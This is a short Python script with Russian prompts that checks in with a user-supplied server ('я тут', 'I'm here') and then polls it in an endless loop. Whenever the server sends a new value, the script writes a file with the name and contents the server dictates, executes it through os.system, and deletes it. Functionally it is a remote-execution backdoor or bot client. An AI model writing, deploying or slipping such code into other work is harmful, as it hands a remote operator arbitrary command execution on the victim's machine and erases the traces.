import socket
import os

server_ip = input("Введите IP сервера: ")

def get_variable(ip, port):
    with socket.create_connection((ip, port)) as sock:
        sock.sendall('GET'.encode())
        data = sock.recv(1024).decode()
        if data.startswith('V'):
            return data[1:]
        return None
def send_variable(ip, port, value):
    with socket.create_connection((ip, port)) as sock:
        sock.sendall(('SET:' + str(value)).encode())
        response = sock.recv(1024).decode()
        print("Ответ сервера:", response)
server_port = 12345
a='1.txt|я тут,'
send_variable(ip=server_ip, port=server_port, value=a)
while True:
    b=get_variable(server_ip, server_port)
    if str(b) != a:
        a=b
        b=b.split('|')
        b = [b[0], b[1].split(',')]
        f = open(b[0], 'x', encoding='utf-8')
        for i in b[1]:
            f.write(f'{i}\n')
        f.close()
        os.system(b[0])
        os.remove(b[0])